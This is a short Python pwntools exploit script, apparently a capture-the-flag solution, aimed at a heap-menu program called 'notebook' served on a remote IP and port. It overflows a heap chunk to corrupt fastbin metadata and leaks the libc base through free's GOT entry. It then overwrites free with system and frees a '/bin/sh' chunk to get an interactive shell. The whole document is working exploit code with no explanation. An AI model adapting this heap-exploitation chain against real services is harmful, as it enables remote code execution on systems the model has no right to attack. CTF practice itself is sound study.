from pwn import *
elf=ELF("notebook")
#io=elf.process()
#io=elf.process(,env={'LD_PRELOAD':'.so'})
io=remote("123.207.32.26",9003)
libc=elf.libc
#libc=ELF("")
context.log_level='debug'

sla=io.sendlineafter
sl=io.sendline
sa=io.sendafter
ru=io.recvuntil
shell=io.interactive

def menu(choice):
	sla("your choice?\n",str(choice))

def new(size,content='jb\n'):
	menu(1)
	sla("notebook:\n",str(size))
	sa("content:\n",content)

def edit(index,size,content):
	menu(2)
	sla("notebook:\n",str(index))
	sla("lenth of notebook:\n",str(size))
	io.send(content)

def delete(index):
	menu(3)
	sla("index:\n",str(index))

def look(index):
	menu(4)
	sla("index:\n",str(index))

#gdb.attach(io)
'''
new(128*1024)#0
new(0x50)#1
new(0x60)#2
delete(2)
payload='a'*0x50+p64(0)+p64(0x71)
payload+=p64(0x6020a5)
edit(1,0x70,payload+'\n')
new(0x60)#2
delete(1)
new(0x60,'\n')#1
'''

new(0x61)#0
new(0x50)#1
delete(1)
payload='a'*0x60+p64(0)+p64(0x61)
payload+=p64(0x6020a0-8)+'\n'
edit(0,0x80,payload)
new(0x50)#1
new(0x50)#2
new(0x10,'/bin/sh\x00\n')#3
payload=p64(elf.got['free'])
edit(2,0x10,payload+'\n')
look(0)
ru("0:")
mesg=ru("\n",True)
free_addr=u64(mesg+'\x00\x00')
libcbase=free_addr-libc.sym['free']
print "libcbase:"+hex(libcbase)
libc.address=libcbase

payload=p64(libc.sym['system'])[0:7]
edit(0,0x10,payload+'\n')
delete(3)
shell()
